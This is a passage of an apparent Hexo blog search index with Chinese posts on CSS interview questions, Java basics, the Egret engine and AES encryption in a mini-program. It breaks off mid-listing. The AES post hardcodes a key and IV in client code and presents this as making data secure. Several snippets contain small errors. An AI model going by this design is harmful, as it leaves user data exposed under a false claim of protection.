id=\"网页中使用什么类型的图片该如何取舍\"><a href=\"#网页中使用什么类型的图片该如何取舍\" class=\"headerlink\" title=\"网页中使用什么类型的图片该如何取舍\"></a>网页中使用什么类型的图片该如何取舍</h3><h3 id=\"如何设置input框中占位信息的样式\"><a href=\"#如何设置input框中占位信息的样式\" class=\"headerlink\" title=\"如何设置input框中占位信息的样式\"></a>如何设置input框中占位信息的样式</h3><p>input:[placehodler]{}<br>进行设置样式</p>\n<h3 id=\"如何设置像五角星一样的不规则点击区域\"><a href=\"#如何设置像五角星一样的不规则点击区域\" class=\"headerlink\" title=\"如何设置像五角星一样的不规则点击区域\"></a>如何设置像五角星一样的不规则点击区域</h3><p>通过svg的polygon属性进行设置</p>\n<h3 id=\"scss有些什么功能，extend\"><a href=\"#scss有些什么功能，extend\" class=\"headerlink\" title=\"scss有些什么功能，extend\"></a>scss有些什么功能，extend</h3><p>extend可以进行继承，<br>可以进行变量定义，可以for循环<br> mixins进行函数式编写css</p>\n","categories":["js"],"tags":["js"]},{"title":"Java基础语法","url":"http://zhoushaw.github.io/2018/01/28/learning/java/java-basics/","content":"<h2 id=\"什么是java\"><a href=\"#什么是java\" class=\"headerlink\" title=\"什么是java\"></a>什么是java</h2><p>java是一门程序设计语言，用于与计算机进行沟通。可用于web后台应用开发、安卓应用开发</p>\n<h2 id=\"JDK、JRE、JVM的区别与联系\"><a href=\"#JDK、JRE、JVM的区别与联系\" class=\"headerlink\" title=\"JDK、JRE、JVM的区别与联系\"></a>JDK、JRE、JVM的区别与联系</h2><blockquote>\n<p>英文全称</p>\n</blockquote>\n<ul>\n<li>JVM — java virtual machine</li>\n<li>JRE — java runtime environment</li>\n<li>JDK — java development kit</li>\n</ul>\n<div><a id=\"more\"></a></div>\n\n<blockquote>\n<p>功能作用</p>\n</blockquote>\n<ul>\n<li><p>JVM: JVM就是我们常说的java虚拟机，它是整个java实现跨平台的 最核心的部分，所有的java程序会首先被编译为.class的类文件，这种类文件可 以在虚拟机上执行，也就是说class并不直接与机器的操作系统相对应，而是经过虚拟机间接与操作系统交互，由虚拟机将程序解 释给本地系统执行。</p>\n</li>\n<li><p>Jre: JRE是指java运行环境。光有JVM还不能成class的 执行，因为在解释class的时候JVM需要调用解释所需要的类库lib。 在JDK的安装目 录里你可以找到jre目录，里面有两个文件夹bin和lib,在 这里可以认为bin里的就是jvm，lib中则是jvm工 作所需要的类库，而jvm和 lib和起来就称为jre。所以，在你写完java程序编译成.class之后，你可以把这个.class文件 和jre一起打包发给朋友，这样你的朋友就 可以运行你写程序了</p>\n</li>\n<li><p>Jdk: JDK是java开发工具包，基本上每个学java的人都会先在机器 上装一个JDK，那他都包含哪几部分呢？让我们看一下JDK的安装目录。在目录下面有 六个文件夹、一个src类库源码压缩包、和其他几个声明文件。其中，真正在运行java时起作用的 是以下四个文件夹:bin、include、lib、 jre。现在我们可以看出这样一个关系，JDK包含JRE，而JRE包 含JVM。</p>\n</li>\n</ul>\n<h2 id=\"包\"><a href=\"#包\" class=\"headerlink\" title=\"包\"></a>包</h2><p>其实就是文件夹，用于把相同的类名进行区分，全部小写，单级:liuyi，多级:cn.itcast</p>\n<blockquote>\n<p>Java中的包是专门用来存放类的，通常功能相同的类存放在相同的包中。在声明包时，使用package语句，具体示例如下:</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package cn.itcast.chapter01; // 使用package关键字声明包</span><br><span class=\"line\">public class Example01&#123;…&#125;</span><br></pre></td></tr></table></figure>\n<p>使用import可以在程序中一次导入某个指定包下的类，这样就不必在每次用到该类时都书写完整类名，简化了代码量。使用import关键字的具体格式如下所示:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import 包名.类名;</span><br></pre></td></tr></table></figure>\n<h2 id=\"书写规范\"><a href=\"#书写规范\" class=\"headerlink\" title=\"书写规范\"></a>书写规范</h2><blockquote>\n<p>类或者接口</p>\n</blockquote>\n<p>一个单词:单词的首字母必须大写，举例:Student,Dog<br>多个单词:每个单词的首字母必须大写举例:HelloWorld，StudentName</p>\n<blockquote>\n<p>方法和变量</p>\n</blockquote>\n<p>一个单词:单词的首字母小写，举例:main,age<br>多个单词:从第二个单词开始，每个单词的首字母大写，举例:studentAge,showAllNames()</p>\n<blockquote>\n<p>常量</p>\n</blockquote>\n<p>一个单词:全部大写，举例:PI<br>多个单词:每个字母都大写，用_隔开，举例:STUDENT_MAX_AGE</p>\n<h2 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h2><ul>\n<li>单行注释，格式: //注释文字</li>\n<li>多行注释，格式: /<em> 注释文字 </em>/</li>\n<li>文档注释，格式:/*<em> 注释文字 </em>/</li>\n</ul>\n<h2 id=\"进制\"><a href=\"#进制\" class=\"headerlink\" title=\"进制\"></a>进制</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190218_62c9782df17lej916jgigg37712il_840x390.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/*</span><br><span class=\"line\">    不同进制的数据表现:</span><br><span class=\"line\">        二进制:由0，1组成。以0b开头。</span><br><span class=\"line\">        八进制:由0,1,...7组成。以0开头。</span><br><span class=\"line\">        十进制:由0,1,...9组成。默认整数是十进制。</span><br><span class=\"line\">        十六进制:由0,1,...9,a,b,c,d,e,f(大小写均可)组成。以0x开头。</span><br><span class=\"line\">*/</span><br><span class=\"line\">class JinZhiDemo &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        System.out.println(100); //十进制 100</span><br><span class=\"line\">        System.out.println(0b100); //二进制，4</span><br><span class=\"line\">        System.out.println(0100); //八进制，64</span><br><span class=\"line\">        System.out.println(0x100); //十六进制，256</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["java"],"tags":["java"]},{"title":"Egret","url":"http://zhoushaw.github.io/2018/01/26/learning/game/egret/","content":"<h2 id=\"更改文件刷新\"><a href=\"#更改文件刷新\" class=\"headerlink\" title=\"更改文件刷新\"></a>更改文件刷新</h2><p>Egret自动编译刷新:</p>\n<p>项目目录下:</p>\n<p>1.egret run -a，启动项目修改自动编译<br>2.全局安装:</p>\n<p><code>npm install -g browser-sync</code></p>\n<p>进入项目文件夹、命令行输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">browser-sync start --server --files &quot;bin-debug/**/*.js, *.html&quot;</span><br></pre></td></tr></table></figure>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"雪碧图\"><a href=\"#雪碧图\" class=\"headerlink\" title=\"雪碧图\"></a>雪碧图</h2><p>在egret中当做纹理集使用</p>\n<p>具体参考:<a href=\"http://developer.egret.com/cn/github/egret-docs/Engine2D/bitmapTexture/useTexture/index.html\" target=\"_blank\" rel=\"noopener\">http://developer.egret.com/cn/github/egret-docs/Engine2D/bitmapTexture/useTexture/index.html</a></p>\n<p>可使用bigshear工具，将雪碧图转换成egret纹理集</p>\n<h2 id=\"动画相关\"><a href=\"#动画相关\" class=\"headerlink\" title=\"动画相关\"></a>动画相关</h2><p>在egret扩展库中提供</p>\n<blockquote>\n<p>game库</p>\n</blockquote>\n<ul>\n<li>可将纹理集做成帧动画</li>\n</ul>\n<blockquote>\n<p>tween</p>\n</blockquote>\n<ul>\n<li>动画库</li>\n<li>移动、变形</li>\n</ul>\n<h2 id=\"MovieClip元素设置大小\"><a href=\"#MovieClip元素设置大小\" class=\"headerlink\" title=\"MovieClip元素设置大小\"></a>MovieClip元素设置大小</h2><blockquote>\n<p>因MovieClip元素无法设置height、width苦恼了很久</p>\n</blockquote>\n<p>解决贴: <a href=\"https://bbs.egret.com/forum.php?mod=viewthread&amp;tid=109&amp;highlight=width\" target=\"_blank\" rel=\"noopener\">https://bbs.egret.com/forum.php?mod=viewthread&amp;tid=109&amp;highlight=width</a></p>\n<p>简单来说就是在egret中width/height和scaleX/scaleY :</p>\n<p>相当于给一个div元素设置了大小与背景图，但背景图设置的属性(没有设置background-size: 100% 100%)大小与当前元素大小相同，这时给div设置了宽高内部的背景图大小也不会发生变化，要使内部图像发生变化，则使用scaleX和scaleY。div和背景图都会发生大小比例变化</p>\n<h2 id=\"不是EUI项目\"><a href=\"#不是EUI项目\" class=\"headerlink\" title=\"不是EUI项目\"></a>不是EUI项目</h2><p>需要手动增加配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//注入自定义的素材解析器</span><br><span class=\"line\">let assetAdapter = new AssetAdapter();</span><br><span class=\"line\">egret.registerImplementation(&quot;eui.IAssetAdapter&quot;, assetAdapter);</span><br><span class=\"line\">egret.registerImplementation(&quot;eui.IThemeAdapter&quot;, new ThemeAdapter());</span><br></pre></td></tr></table></figure>\n","categories":["game"],"tags":["egret"]},{"title":"AES对称加密","url":"http://zhoushaw.github.io/2018/01/25/learning/http/aes-encryption/","content":"<p><img src=\"http://sf.dankal.cn/tmp/wxb6cbb81471348fec.o6zAJszA0KOosUhoTLKll8Q2-ufA.46e2722ada5f99c4d6cbca3b488da45c.jpg\" alt=\"\"></p>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>数据安全</p>\n</blockquote>\n<p>对于一款应用无疑非常重要,明文的数据传输对于应用而言非常致命。</p>\n<blockquote>\n<p>用户的数据，接口、信息等等都暴露在攻击者的面前</p>\n</blockquote>\n<p>1.攻击者只需要获取用户的token信息，就可以通过接口模拟<code>用户行为</code><br>2.使用用户信息模拟<code>用户操作</code></p>\n<blockquote>\n<p>解决目前的安全隐患</p>\n</blockquote>\n<p>前后端统一使用<code>Base64</code> -&gt; <code>AES</code> (<code>key</code>:keyname, <code>iv</code>:ivnum) -&gt; <code>gzip</code>的方式来，进行加密、解密。来确保数据安全</p>\n<h2 id=\"项目结构\"><a href=\"#项目结构\" class=\"headerlink\" title=\"项目结构\"></a>项目结构</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">util</span><br><span class=\"line\">│  </span><br><span class=\"line\">├─encryption</span><br><span class=\"line\">│  ├─Base64.js</span><br><span class=\"line\">│  ├─lock.js</span><br><span class=\"line\">│  ├─pako.js</span><br><span class=\"line\">│  ├─DataCrypt.js</span><br><span class=\"line\">│  │  </span><br><span class=\"line\">│  └─cryptojs</span><br><span class=\"line\">│      ├─lib</span><br><span class=\"line\">│      ├─cryptojs.js</span><br><span class=\"line\">│      ├─package.json</span><br><span class=\"line\">│      └─README.md</span><br><span class=\"line\">└─comutil</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>工具类下的工具函数封装应用</p>\n</blockquote>\n<ul>\n<li>DataCrypt.js 对AES方法进行封装实现自定义key，vi</li>\n<li>pako 实现数据的压缩与解压缩</li>\n<li>base64对数据进行64位编码</li>\n<li>lock.js对以上数据处理方法进行整体封装</li>\n</ul>\n<blockquote>\n<p>locak.js的封装</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引入AES加解密方法</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Encrypt,Decrypt &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./DataCrypt.js'</span></span><br><span class=\"line\"><span class=\"comment\">// 引入Base64位，装换方法。</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Base64 &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./Base64.js'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 引入gizp，js中的压缩与解压缩</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> pako = <span class=\"built_in\">require</span>(<span class=\"string\">'./pako.js'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> lock = <span class=\"function\">(<span class=\"params\">obj</span>)=&gt;</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> jsonStringify,base64Encode,aesEncrypt,deflateString</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 将json数据转成strting类型</span></span><br><span class=\"line\">  jsonStringify = <span class=\"built_in\">JSON</span>.stringify(obj)</span><br><span class=\"line\">  <span class=\"comment\">// 将jsonString数据转成base64位数据</span></span><br><span class=\"line\">  base64Encode = Base64.encode(jsonStringify)</span><br><span class=\"line\">  <span class=\"comment\">// 将base64位数据使用AES进行加密</span></span><br><span class=\"line\">  aesEncrypt = Encrypt(base64Encode); </span><br><span class=\"line\">  <span class=\"comment\">// 将aes加密数据进行压缩</span></span><br><span class=\"line\">  deflateString = pako.deflate(aesEncrypt, &#123; <span class=\"attr\">to</span>: <span class=\"string\">'string'</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> deflateString</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> unlock = <span class=\"function\">(<span class=\"params\">obj</span>)=&gt;</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> jsonParse,base64Decode,aesDecrypt,inflateString</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 将压缩的数据解压缩</span></span><br><span class=\"line\">  inflateString = pako.inflate(obj, &#123; <span class=\"attr\">to</span>: <span class=\"string\">'string'</span> &#125;)</span><br><span class=\"line\">  <span class=\"comment\">// 将数据使用AES解码</span></span><br><span class=\"line\">  aesDecrypt = Decrypt(inflateString)</span><br><span class=\"line\">  <span class=\"comment\">// 将base64位数据转成jsonstring格式</span></span><br><span class=\"line\">  base64Decode = Base64.decode(aesDecrypt)</span><br><span class=\"line\">  <span class=\"comment\">// 将jsonstringify格式数据转成JSON数据</span></span><br><span class=\"line\">  jsonParse = <span class=\"built_in\">JSON</span>.parse(base64Decode)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> jsonParse</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123; lock,unlock &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pako-js\"><a href=\"#pako-js\" class=\"headerlink\" title=\"pako.js\"></a>pako.js</h2><blockquote>\n<p>压缩模块，可以对内容进行压缩和解压缩</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install pako</span><br></pre></td></tr></table></figure>\n<p>模块安装完成之后使用，dist目录内的pako.js即可</p>\n<blockquote>\n<p>使用</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> pako = <span class=\"built_in\">require</span>(<span class=\"string\">'./pako.js'</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> deflateString = pako.deflate(obj, &#123; <span class=\"attr\">to</span>: <span class=\"string\">'string'</span> &#125;);</span><br><span class=\"line\"><span class=\"keyword\">let</span> inflateString = pako.inflate(obj, &#123; <span class=\"attr\">to</span>: <span class=\"string\">'string'</span> &#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"CryptoJS核心\"><a href=\"#CryptoJS核心\" class=\"headerlink\" title=\"CryptoJS核心\"></a>CryptoJS核心</h2><p>AES加密在密码学中又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准</p>\n<blockquote>\n<p>起步</p>\n</blockquote>\n<pre>\n    npm install cryptojs\n</pre>\n\n<blockquote>\n<p>封装 DataCrypt.js,对cryptojs进行使用</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> Crypto = <span class=\"built_in\">require</span>(<span class=\"string\">'./cryptojs/cryptojs'</span>).Crypto;</span><br><span class=\"line\"><span class=\"keyword\">const</span> Encrypt = <span class=\"function\">(<span class=\"params\">word</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> mode = <span class=\"keyword\">new</span> Crypto.mode.CBC(Crypto.pad.pkcs7);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> eb = Crypto.charenc.UTF8.stringToBytes(word);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> kb = Crypto.charenc.UTF8.stringToBytes(<span class=\"string\">\"dankal1234567891\"</span>);<span class=\"comment\">//KEY</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> vb = Crypto.charenc.UTF8.stringToBytes(<span class=\"string\">\"12345678\"</span>);<span class=\"comment\">//IV</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> ub = Crypto.AES.encrypt(eb,kb,&#123;<span class=\"attr\">iv</span>:vb,<span class=\"attr\">mode</span>:mode,<span class=\"attr\">asBpytes</span>:<span class=\"literal\">true</span>&#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ub;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//解密:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span>   Decrypt = <span class=\"function\">(<span class=\"params\">word</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> mode = <span class=\"keyword\">new</span> Crypto.mode.CBC(Crypto.pad.pkcs7);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> eb = Crypto.util.base64ToBytes(word);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> kb = Crypto.charenc.UTF8.stringToBytes(<span class=\"string\">\"dankal1234567891\"</span>);<span class=\"comment\">//KEY</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> vb = Crypto.charenc.UTF8.stringToBytes(<span class=\"string\">\"12345678\"</span>);<span class=\"comment\">//IV</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> ub = Crypto.AES.decrypt(eb,kb,&#123;<span class=\"attr\">asBpytes</span>:<span class=\"literal\">true</span>,<span class=\"attr\">mode</span>:mode,<span class=\"attr\">iv</span>:vb&#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ub;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123;</span><br><span class=\"line\">    Encrypt,</span><br><span class=\"line\">    Decrypt</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"javascript-base64位编码\"><a href=\"#javascript-base64位编码\" class=\"headerlink\" title=\"javascript base64位编码\"></a>javascript base64位编码</h2><blockquote>\n<p>由于在小程序中有诸多限制base64位转码方法有特定限制</p>\n</blockquote>\n<p>base64文件可以自行下载，这里列出一个，我再项目中使用的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Base64 &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./Base64.js'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//编码</span></span><br><span class=\"line\"> base64Encode = Base64.encode(jsonStringify)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//解码</span></span><br><span class=\"line\"> base64Decode = Base64.decode(aesDecrypt)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>base64源码</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">;(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">global, factory</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">typeof</span> exports === <span class=\"string\">'object'</span> &amp;&amp; <span class=\"keyword\">typeof</span> <span class=\"built_in\">module</span> !== <span 